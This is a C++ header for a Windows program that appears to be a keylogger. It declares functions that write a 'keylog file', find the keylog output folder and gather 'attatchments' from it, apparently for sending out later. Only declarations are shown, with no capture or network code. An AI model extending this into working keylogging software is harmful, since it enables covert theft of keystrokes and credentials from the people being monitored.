#pragma once

#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <windows.h>

#include "Settings.h"

namespace IO
{
	/**
 	 * Creates new directory
	 * creates all subdirectories in path
	 * without throwing error
 	 **/
	bool MkDir(std::string path);

	/**
 	 * Writes to new keylog file
 	 * Returns empty string if file failed to open
 	 **/
	template <class T>
	std::string WriteLog(const T &t);

	// Writes to debug log
	void WriteAppLog(const std::string &s);

	// Gets path of keylog folder
	std::string GetOutputPath(const bool append_seperator = false);

	// Gets all attatchments in output folder
	std::vector<std::string> GetAttatchments(const std::string &path);
}

#endif
